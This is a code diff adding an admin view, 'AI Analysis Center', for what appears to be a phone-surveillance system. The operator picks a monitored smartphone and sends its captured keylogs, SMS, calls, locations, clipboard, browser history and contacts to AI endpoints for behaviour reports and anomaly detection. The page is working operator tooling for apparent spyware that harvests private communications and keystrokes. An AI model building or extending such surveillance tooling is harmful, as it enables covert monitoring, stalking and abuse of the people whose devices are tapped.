@@ -1,0 +1,156 @@
+<div class="ai-analysis-page" style="padding: 20px;">
+  <style>
+    .ai-card { background: #1a1a2e; border: 1px solid #30305a; border-radius: 12px; padding: 20px; margin-bottom: 20px; }
+    .ai-card h3 { color: #00d4ff; margin-top: 0; }
+    .ai-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; margin-bottom: 20px; }
+    .ai-btn { padding: 12px 24px; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; font-weight: 600; margin: 5px; transition: all 0.3s; }
+    .ai-btn-primary { background: linear-gradient(135deg, #667eea, #764ba2); color: white; }
+    .ai-btn-success { background: linear-gradient(135deg, #11998e, #38ef7d); color: white; }
+    .ai-btn-warning { background: linear-gradient(135deg, #f093fb, #f5576c); color: white; }
+    .ai-btn-info { background: linear-gradient(135deg, #4facfe, #00f2fe); color: white; }
+    .ai-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+    .ai-btn:disabled { opacity: 0.5; cursor: wait; }
+    .ai-output { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 20px; margin-top: 15px; color: #c9d1d9; font-family: monospace; white-space: pre-wrap; max-height: 600px; overflow-y: auto; min-height: 100px; }
+    .ai-select { padding: 10px; border-radius: 6px; border: 1px solid #30305a; background: #1a1a2e; color: #e0e0e0; font-size: 14px; margin: 5px; }
+    .ai-label { color: #8b949e; font-size: 13px; margin-right: 8px; }
+    .ai-status { display: inline-block; padding: 4px 12px; border-radius: 12px; font-size: 12px; font-weight: 600; }
+    .ai-loading { display: none; color: #00d4ff; padding: 20px; text-align: center; }
+    .ai-loading.active { display: block; }
+    .ai-spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid #30305a; border-top: 3px solid #00d4ff; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 10px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+
+  <h2 style="color: #00d4ff; margin-bottom: 5px;">🧠 AI Analysis Center</h2>
+  <p style="color: #8b949e;">Intelligent analysis of collected device data using AI</p>
+
+  <!-- Controls -->
+  <div class="ai-card">
+    <h3>📱 Device & Period</h3>
+    <span class="ai-label">Device:</span>
+    <select id="ai-device" class="ai-select">
+      <option value="">Select device...</option>
+      <% Smartphone.all.each do |s| %>
+        <option value="<%= s.id %>"><%= s.name || "Device ##{s.id}" %></option>
+      <% end %>
+    </select>
+    <span class="ai-label">Period:</span>
+    <select id="ai-period" class="ai-select">
+      <option value="1">Last 24 hours</option>
+      <option value="3">Last 3 days</option>
+      <option value="7" selected>Last 7 days</option>
+      <option value="14">Last 14 days</option>
+      <option value="30">Last 30 days</option>
+    </select>
+    <span class="ai-label">Data Type:</span>
+    <select id="ai-datatype" class="ai-select">
+      <option value="keylogs">⌨️ Keylogs</option>
+      <option value="locations">📍 Locations</option>
+      <option value="sms">💬 SMS</option>
+      <option value="calls">📞 Calls</option>
+      <option value="apps">📱 App Usage</option>
+      <option value="clipboard">📋 Clipboard</option>
+      <option value="browser">🌐 Browser</option>
+      <option value="contacts">👥 Contacts</option>
+    </select>
+  </div>
+
+  <!-- Action Buttons -->
+  <div class="ai-card">
+    <h3>🎯 Analysis Actions</h3>
+    <div class="ai-grid">
+      <div>
+        <button class="ai-btn ai-btn-primary" onclick="aiBehaviorReport()">📊 Full Behavior Report</button>
+        <p style="color:#8b949e; font-size:12px; margin:5px 0 0 5px;">Comprehensive analysis of ALL device data</p>
+      </div>
+      <div>
+        <button class="ai-btn ai-btn-success" onclick="aiDailySummary()">📋 Daily Summary</button>
+        <p style="color:#8b949e; font-size:12px; margin:5px 0 0 5px;">Quick overview of today's activity</p>
+      </div>
+      <div>
+        <button class="ai-btn ai-btn-warning" onclick="aiAnomalyDetection()">⚠️ Anomaly Detection</button>
+        <p style="color:#8b949e; font-size:12px; margin:5px 0 0 5px;">Find suspicious patterns and unusual behavior</p>
+      </div>
+      <div>
+        <button class="ai-btn ai-btn-info" onclick="aiAnalyzeData()">🔬 Analyze Specific Data</button>
+        <p style="color:#8b949e; font-size:12px; margin:5px 0 0 5px;">Deep dive into selected data type</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Output -->
+  <div class="ai-card">
+    <h3>📄 AI Response</h3>
+    <div id="ai-loading" class="ai-loading">
+      <span class="ai-spinner"></span> AI is analyzing data... This may take 15-30 seconds.
+    </div>
+    <div id="ai-output" class="ai-output">Select a device and click an action button to start AI analysis.</div>
+  </div>
+</div>
+
+<script>
+function getDevice() {
+  var d = document.getElementById('ai-device').value;
+  if (!d) { alert('⚠️ Please select a device first'); return null; }
+  return d;
+}
+
+function showLoading() {
+  document.getElementById('ai-loading').className = 'ai-loading active';
+  document.querySelectorAll('.ai-btn').forEach(function(b) { b.disabled = true; });
+}
+
+function hideLoading() {
+  document.getElementById('ai-loading').className = 'ai-loading';
+  document.querySelectorAll('.ai-btn').forEach(function(b) { b.disabled = false; });
+}
+
+function showResult(data) {
+  hideLoading();
+  var output = document.getElementById('ai-output');
+  if (typeof data === 'string') {
+    output.textContent = data;
+  } else {
+    output.textContent = JSON.stringify(data, null, 2);
+  }
+}
+
+function aiPost(action, params) {
+  showLoading();
+  var token = document.querySelector('meta[name="csrf-token"]').content;
+  fetch('/admin/ai_analysis/' + action, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': token },
+    body: JSON.stringify(params)
+  })
+  .then(function(r) { return r.json(); })
+  .then(function(data) {
+    var text = data.report || data.summary || data.anomalies || data.analysis || data;
+    showResult(text);
+  })
+  .catch(function(e) { showResult('Error: ' + e.message); });
+}
+
+function aiBehaviorReport() {
+  var d = getDevice(); if (!d) return;
+  aiPost('behavior_report', { device_id: d, period_days: document.getElementById('ai-period').value });
+}
+
+function aiDailySummary() {
+  var d = getDevice(); if (!d) return;
+  aiPost('daily_summary', { device_id: d });
+}
+
+function aiAnomalyDetection() {
+  var d = getDevice(); if (!d) return;
+  aiPost('anomaly_detection', { device_id: d, period_days: document.getElementById('ai-period').value });
+}
+
+function aiAnalyzeData() {
+  var d = getDevice(); if (!d) return;
+  aiPost('analyze_data', {
+    device_id: d,
+    data_type: document.getElementById('ai-datatype').value,
+    period_days: document.getElementById('ai-period').value
+  });
+}
+</script>
